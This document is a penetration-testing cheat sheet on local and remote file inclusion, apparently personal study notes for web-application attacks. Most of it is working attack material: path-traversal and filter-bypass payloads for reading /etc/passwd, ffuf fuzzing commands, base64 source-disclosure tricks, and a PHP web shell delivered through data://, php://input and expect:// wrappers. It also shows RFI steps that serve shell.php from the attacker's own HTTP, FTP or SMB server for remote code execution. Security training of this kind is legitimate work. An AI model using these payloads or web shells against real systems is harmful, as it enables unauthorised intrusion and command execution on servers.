# 📄 File Inclusion

## LFI

The following table shows which functions may execute files and which only read file content:

<table data-header-hidden><thead><tr><th width="340"></th><th width="148"></th><th width="124"></th><th></th></tr></thead><tbody><tr><td><strong>Function</strong></td><td><strong>Read Content</strong></td><td><strong>Execute</strong></td><td><strong>Remote URL</strong></td></tr><tr><td><strong>PHP</strong></td><td></td><td></td><td></td></tr><tr><td><code>include()</code>/<code>include_once()</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><code>require()</code>/<code>require_once()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><code>file_get_contents()</code></td><td>✅</td><td>❌</td><td>✅</td></tr><tr><td><code>fopen()</code>/<code>file()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><strong>NodeJS</strong></td><td></td><td></td><td></td></tr><tr><td><code>fs.readFile()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>fs.sendFile()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>res.render()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><strong>Java</strong></td><td></td><td></td><td></td></tr><tr><td><code>include</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>import</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><strong>.NET</strong></td><td></td><td></td><td></td></tr><tr><td><code>@Html.Partial()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>@Html.RemotePartial()</code></td><td>✅</td><td>❌</td><td>✅</td></tr><tr><td><code>Response.WriteFile()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>include</code></td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table>

```
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd 
# Basic LFI
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd 
# Path Traversal
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd 
# Bypass Filename Prefix
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
# Bypass Non-Recursive Path Traversal Filters
<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
# URL encoded
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
# Approved path
/etc/passwd%00.php


ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
# ffuf lfi files
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
# ffuf server webroot
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
# ffuf server logs/config


```

Although the ffuf scan result might return 302 or no contents it's worth checking the source code using LFI.

**Source Code Disclosure**

<pre class="language-url"><code class="lang-url">php://filter/read=convert.base64-encode/resource=config
<strong>http://&#x3C;SERVER_IP>:&#x3C;PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
</strong></code></pre>

### PHP Wrappers

We can use many methods to execute remote commands

#### Data

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.

**Checking PHP Configurations at** `/etc/php/X.Y/apache2/php.ini`

```shell-session
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

we can decode it and `grep` for `allow_url_include` to see its value

```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

**Remote Code Execution**

first step would be to base64 encode a basic PHP web shell

```shell-session
echo '<?php system($_GET["cmd"]); ?>' | base64
```

then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

```shell-session
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

#### Input

[input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code.&#x20;

We pass our input to the `input` wrapper as a **POST** request's data.

Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

```shell-session
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

#### Expect

[expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams.

Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

```shell-session
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

## RFI

if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:

1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host

<table data-header-hidden><thead><tr><th width="349"></th><th width="140"></th><th width="125"></th><th></th></tr></thead><tbody><tr><td><strong>Function</strong></td><td><strong>Read Content</strong></td><td><strong>Execute</strong></td><td><strong>Remote URL</strong></td></tr><tr><td><strong>PHP</strong></td><td></td><td></td><td></td></tr><tr><td><code>include()</code>/<code>include_once()</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><code>file_get_contents()</code></td><td>✅</td><td>❌</td><td>✅</td></tr><tr><td><strong>Java</strong></td><td></td><td></td><td></td></tr><tr><td><code>import</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><strong>.NET</strong></td><td></td><td></td><td></td></tr><tr><td><code>@Html.RemotePartial()</code></td><td>✅</td><td>❌</td><td>✅</td></tr><tr><td><code>include</code></td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table>

### Verify RFI

any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled. even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with

more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content.

http://\<SERVER\_IP>:/index.php?language=http://127.0.0.1:80/index.php

#### Remote Code Execution

```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**http**

```shell-session
sudo python3 -m http.server <LISTENING_PORT>
```

http://\<SERVER\_IP>:/index.php?language=http://\<OUR\_IP>:\<LISTENING\_PORT>/shell.php\&cmd=id

**FTP**

```shell-session
sudo python -m pyftpdlib -p 21
```

http://\<SERVER\_IP>:/index.php?language=ftp://\<OUR\_IP>/shell.php\&cmd=id

or

```shell-session
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

**SMB (Windows)**

```shell-session
impacket-smbserver -smb2support share $(pwd)
```

http://\<SERVER\_IP>:/index.php?language=\\\<OUR\_IP>\share\shell.php\&cmd=whoami



